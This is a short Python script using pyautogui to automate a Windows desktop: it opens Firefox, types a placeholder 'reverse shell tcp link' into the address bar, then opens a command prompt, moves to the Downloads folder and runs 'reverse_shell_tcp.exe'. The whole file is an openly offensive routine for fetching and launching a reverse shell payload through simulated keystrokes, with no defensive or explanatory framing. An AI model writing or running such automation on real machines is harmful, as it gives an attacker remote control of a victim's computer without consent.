import pyautogui
import time

pyautogui.hotkey('win' , 'r')
pyautogui.typewrite('firefox')
pyautogui.hotkey('enter')
pyautogui.click(x=309, y=55, clicks=1, button='left')
pyautogui.typewrite('reverse shell tcp link')
time.sleep(3)
pyautogui.hotkey('win' , 'r')
pyautogui.typewrite('cmd')
pyautogui.hotkey('enter')
time.sleep(1)
pyautogui.typewrite('cd downloads')
pyautogui.hotkey('enter')
time.sleep(1)
pyautogui.typewrite('reverse_shell_tcp.exe')
pyautogui.hotkey('enter')
pyautogui.hotkey('enter')
